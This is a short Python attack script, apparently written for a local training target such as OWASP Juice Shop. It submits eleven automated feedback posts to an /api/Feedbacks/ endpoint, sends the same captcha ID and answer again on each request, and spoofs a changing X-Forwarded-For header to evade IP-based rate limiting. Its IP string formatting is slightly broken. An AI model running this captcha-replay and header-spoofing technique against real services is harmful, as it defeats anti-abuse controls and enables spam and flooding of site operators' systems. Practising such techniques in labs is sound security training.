import requests

URL = "http://192.168.56.103:3000/api/Feedbacks/"
CAPTCHA_ID = 2
CAPTCHA_ANSWER = "2"

print("[*] Starting automated feedback submissions...")

for i in range(1, 12):
	headers = {
		"Content-Type": "application/json",
		"X-Forwarded-For": f"10.0.0{i}"
	}
	payload = {
		"comment": f"Automated journal entry test #{i}",
		"rating": 5,
		"captchaId": CAPTCHA_ID,
		"captcha": CAPTCHA_ANSWER
	}
	res = requests.post(URL, json=payload, headers=headers)
	print(f"[{i}/11] Status: {res.status_code} | Server Reply: {res.text[:60]}")

print("[+] Execution complete.")
